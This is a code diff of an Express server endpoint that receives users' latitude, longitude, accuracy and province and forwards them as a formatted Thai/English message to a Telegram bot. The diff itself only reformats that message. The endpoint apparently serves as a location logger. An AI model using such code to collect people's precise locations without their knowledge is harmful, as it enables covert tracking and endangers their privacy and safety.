@@ -13,17 +13,16 @@ let userCounter = 1;
 app.post('/save-location', async (req, res) => {
   const { latitude, longitude, accuracy, province, timestamp } = req.body;
   const locationUrl = `https://maps.google.com/?q=${latitude},${longitude}`;
-  const message =
-`📍 ผู้ใช้งานลำดับที่ #${userCounter} (User #${userCounter})
-🗺️ จังหวัด (Province): ${province}
-🌐 ตำแหน่ง (Location): ${locationUrl}
-📌 พิกัด (Coordinates):
-   └─ ละติจูด (Latitude): ${latitude}
-   └─ ลองจิจูด (Longitude): ${longitude}
-📏 ความแม่นยำ (Accuracy): ~${accuracy} เมตร (meters)
-🕒 เวลา (Time): ${new Date(timestamp).toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' })}`;
+  const timeFormatted = new Date(timestamp).toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' });
 
-  userCounter++;
+  const message = `📍 ผู้ใช้งานลำดับที่ #${userCounter++} (User #${userCounter - 1})
+จังหวัด: ${province}
+🌐 สถานที่ / Location: ${locationUrl}
+📌 พิกัด / Coordinates: 
+   ละติจูด (Latitude): ${latitude}
+   ลองจิจูด (Longitude): ${longitude}
+📏 ความแม่นยำ / Accuracy: ประมาณ ~${accuracy} เมตร
+🕒 เวลา / Time: ${timeFormatted}`;
 
   try {
     await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -43,5 +42,5 @@ app.get('*', (req, res) => {
 
 const port = process.env.PORT || 3000;
 app.listen(port, () => {
-  console.log(`🚀 Server running at http://localhost:${port}`);
+  console.log(`🚀 Server running on http://localhost:${port}`);
 });
